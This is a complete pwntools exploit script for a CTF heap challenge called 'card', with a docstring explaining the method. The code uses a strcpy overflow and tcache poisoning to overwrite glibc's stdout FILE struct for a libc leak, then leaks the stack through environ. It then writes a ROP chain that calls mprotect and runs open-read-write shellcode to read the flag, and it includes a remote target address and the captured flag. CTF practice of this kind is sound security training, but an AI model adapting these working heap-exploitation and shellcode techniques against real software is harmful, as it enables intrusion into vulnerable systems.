"""
A fairly standard heap challenge. The way the binary stores input in a buffer before strcpy-ing it
gives us a large buffer overflow: First write data into a larger chunk, then write full-length
into a smaller chunk. The binary doesn't null-terminate this string, so when strcpy runs it copies
the remnants of the previous, larger sized chunk as well.

We use the overflow to first edit the size of a chunk and then free it into the unsortedbin. This
chunk overlaps with other chunks on the heap, so we remainder chunks off of this one until the fd
pointer of the unsortedbin chunk overlaps with the fd pointer of one in the tcache. We then
use a hidden edit function to overwrite the 2 least significant bytes so it will hopefully point
to the _IO_2_1_stdout_ file stream struct (there are still 4 bits of ASLR, so its only 1/16). 
Allocating this chunk out of the tcache will let us overwrite fields in that struct, giving us a
libc leak.

We us the libc leak and our control over the stdout file struct to leak the stack location from the
environ symbol. The buffer overflow is used to do another tcache poisioning attack, this time 
allowing us to allocate a chunk on stack. We use this to write a ROP chain and shellcode directly
onto the stack. The ROP chain calls mprotect on the page that the stack is in, and then jumps to
the shellcode, which ORWs the flag.
"""
from pwn import *

binary_path = "./card"

#lib_path = "./lib/"
#LIBC_LEAK_OFFSET = 0x1eb980
#STDOUT_OFFSET = 0x1ec6a0

lib_path = "/home/kali/HeapLAB/.glibc/glibc_2.31/"
LIBC_LEAK_OFFSET = 0x3b5980
STDOUT_OFFSET = 0x3b66a0

#=Boilerplate=================================================================#

elf = context.binary = ELF(binary_path)
libc = ELF(lib_path + "libc.so.6")

gs="""

contextwatch execute "vis"

python
import splitmind
(splitmind.Mind()
    .tell_splitter(show_titles=True)
    .tell_splitter(set_title="gdb")
    .above(of="main", display="expressions", size="75%")
    .left(of="expressions", display="regs", size="35%")
    .above(of="regs", display="disasm")
    .above(of="disasm", display="stack")
).build(nobanner=True)
end

continue
"""
def start():
    global cards

    cards = [False] * 0x100

    if args.DEBUG:
        context.log_level = "DEBUG"

    if args.REMOTE:
        # nc 45.77.72.122 9777
        return remote("45.77.72.122", 9777)
        #return remote("localhost", 1337)

    if args.GDB:
        context.terminal = ["tmux", "split-window", "-v", "-b", "-p", "80"]
        return gdb.debug(binary_path, gdbscript=gs, env={"LD_LIBRARY_PATH": lib_path})
    else:
        return process(binary_path, env={"LD_LIBRARY_PATH": lib_path})


def breakpoint(io):
    if args.GDB:
        print("*** BREAKPOINT ***")
        io.interactive()


def add_card(size, clean=True):
    io.sendline("1")

    io.recvuntil("Size: ")
    io.sendline(f"{size}")

    if clean:
        io.recvuntil("Choice:")
        io.clean()

    for i in range(len(cards)):
        if not cards[i]:
            cards[i] = True
            return i
    raise Error("Out of cards")


def edit(card, content, trailing_null=False, clean=True):
    if trailing_null:
        content += p8(0x00)

    io.sendline("2")
    
    io.recvuntil("Index: ")
    io.sendline(f"{card}")

    io.recvuntil("Message: ")
    io.sendline(content)

    if clean:
        io.recvuntil("Choice:")
        io.clean()


def drop_card(card, clean=True):
    io.sendline("3")

    io.recvuntil("Index: ")
    io.sendline(f"{card}")

    if clean:
        io.recvuntil("Choice:")
        io.clean()

    cards[card] = False


def edit_with_read(card, content, clean=True):
    io.sendline("5")

    io.recvuntil("Index: ")
    io.sendline(f"{card}")

    io.recvuntil("Message: ")
    io.sendline(content)

    if clean:
        io.recvuntil("Choice:")
        io.clean()


def edit_with_nulls(card, content):
    """
    The default edit function uses strcopy, so in order to write null bytes we work backwards, and
    use the null terminator to write nulls
    """
    buf = []
    size = len(content)
    content = bytes(content)
    for i, b in enumerate(content[::-1]):
        if b == 0 and len(buf) > 0:
            position = size - i
            content = bytes(buf[::-1])
            print(f"position: {hex(position)}, contents: {content}")
            edit(card, flat({
                position: content
            }), trailing_null=True)
            buf = []
        elif b == 0:
            edit(card, b"A" * (size - i - 1), trailing_null=True)
        else:
            buf.append(b)

    if len(buf) > 0:
        content = bytes(buf[::-1])
        edit(card, content, trailing_null=True)


def exploit(io):
    A = add_card(0x18)
    B = add_card(0x18)
    C = add_card(0x48)
    
    # There's not hard limit on chunk size, but the way the binary buffers data before writing it
    # means that if the chunk size is to large the memset will fault (will try and write into a
    # non-writable page).
    D_1 = add_card(0x1f8)
    D_2 = add_card(0x1f8)
    
    # Add chunk to tcache so we can modify the fd pointer on the next freed chunk (not this one)
    E = add_card(0x48)
    drop_card(E)
    
    # Set up fake chunk so we can change B's size and free it
    edit(D_2, flat({ 
        0x1a8: p8(0xa1)
    }), trailing_null=True)

    # Set up buffer overflow to overwrite size
    edit(C, flat({
        0x18: p16(0x421)
    }), trailing_null=True)
    edit(A, b"A" * 0x18)
       
##################################
#    breakpoint(io)
##################################

    # Free C into tcache to ready some poison
    drop_card(C)
    
    # Free B to create an overlapping chunk in the unsorted bin
    drop_card(B)
    
    # Remainder off a 0x20 chunk off of the unsorted bin (in the same place that B used to be)
    # This is padding, and causes the unsorted bins fd and bk pointers to overlap the tcachebins
    B2 = add_card(0x18)
    
    # Allocate a chunk that overlaps one in a tcache bin, allowing us to poison the tcache. Need to use the
    # hidden read option to avoid the null terminator
    if args.GDB:
        OVERWRITE = add_card(3)
        edit_with_read(OVERWRITE, pack(0xdd06a0, 24))
    else:
        OVERWRITE = add_card(2)
        edit_with_read(OVERWRITE, p16(0x26a0))
    
##################################
#    breakpoint(io)
##################################
    
    # Allocate out to the tcache. The next 0x50 chunk will be the stdout chunk. Will also
    # overlap with the following chunk, allowing another tcache poison for hopefully code
    # execution
    C2 = add_card(0x48)
   
    # Leak Libc by overwriting some fields on _IO_2_1_stdout_, causing it to write out some
    # libc pointers_
    STDOUT_CHUNK = add_card(0x48)
    
    io.clean()
    edit(STDOUT_CHUNK, flat({
        0x00: p64(0x01010101fbad1801),
        0x08: p64(0xffffffffffffffff) * 3
    }), trailing_null=True, clean=False)
    
    leak = io.recvuntil("Choice:")
    if len(leak) < 0x60:
        raise Error("BAD ASLR")
    
    libc_leak = u64(leak[9:17])
    libc.address = libc_leak - LIBC_LEAK_OFFSET
    
    print(f"LIBC: {hex(libc.address)}")

    # Leak stack address by overwritting fields in IO_2_1_stdout_ again (we know libc now,
    # so we can be more targeted). We leak the environ pointer, which is on the stack
    io.clean()

    # Setup write base, ptr, and end correctly to write out the 8 bytes of the pointer.
    # The newline would mess with the the buf_base field, so we overwrite that as well
    # so that when the write finishes everything resets
    write_base = libc.sym.environ
    write_ptr = write_base + 8
    write_end = write_ptr + 1
    buf_base = libc.address + STDOUT_OFFSET + 131
    buf_end = buf_base + 1

    edit_with_read(STDOUT_CHUNK, flat({ # use edit_with_read as address have nulls that need to be
        0x00: p64(0xfbad1800),          # written all at once
        0x20: p64(write_base) + p64(write_ptr) + p64(write_end) + p64(buf_base) + p64(buf_end) 
    }), clean=False)

    leak = io.recvuntil("Choice:")
    stack_leak = u64(leak[:8])
    print(f"STACK: {hex(stack_leak)}")

    # Poison tcache again to create a chunk at the edit_with_read function's return address
    edit_with_read_return_addr = stack_leak - 0x120

    D2_1 = add_card(0x100)
    D2_2 = add_card(0x100)

    drop_card(D2_2)
    drop_card(D2_1)

    # Overwrite D2_2's tcache pointer
    edit(C2, flat({
        0x20: edit_with_read_return_addr
    }))

    D3_1 = add_card(0x100)

    STACK_CHUNK = add_card(0x100)

##################################
#    breakpoint(io)
##################################

    # We can now write a rop chain directly onto the stack. Probably simplier to just read the file
    # in the ROP chain directly, but I had a mprotect->file read shellcode setup nearby so I just
    # copied that
    stack_page = 0xfffffffffffff000 & stack_leak
    shellcode_addr = edit_with_read_return_addr + 0x64
    filename_addr = shellcode_addr + 0x64

    rop = ROP(libc)
    rop.mprotect(stack_page, 0x2000, 0x1 | 0x2 | 0x4)
    rop.raw(shellcode_addr)

    # Shellcode to open, read, and write a file to stdout
    shellcode= asm(f"""
        xor rax, rax
        mov al, 0x2
        xor rsi, rsi
        xor rdx, rdx
        mov rdi, {filename_addr}
        syscall
        mov rdi, rax
        xor rax, rax
        mov rsi, {edit_with_read_return_addr + 0x100}
        mov rdx, 0x100
        syscall
        mov rax, 0x1
        mov rdi, rax
        syscall
        mov rax, 0x3c
        xor rdi, rdi
        syscall
    """)


    # Write ROP chain and shellcode onto stack
    edit_with_read(STACK_CHUNK, flat({
        0x00: rop.chain(),
        0x64: shellcode,
        0xc8: b"flag\0"
    }), clean=False)


    flag = io.recvall()

    print(flag)
    
    return flag

    
if args.GDB:
    io = start()
    exploit(io)
    io.interactive()
else:
    running = True
    while running:
        io = start()
        try:
            print("*** STARTING EXPLOIT ***")
            exploit(io)
            running = False
        except (KeyboardInterrupt, SystemExit):
            print("*** GOODBYE ***")
            raise
        except:
            print("*** ASLR WRONG ***")
            io.close()

# GACTF{5331676E-696E-346E64-68617633-66754E}
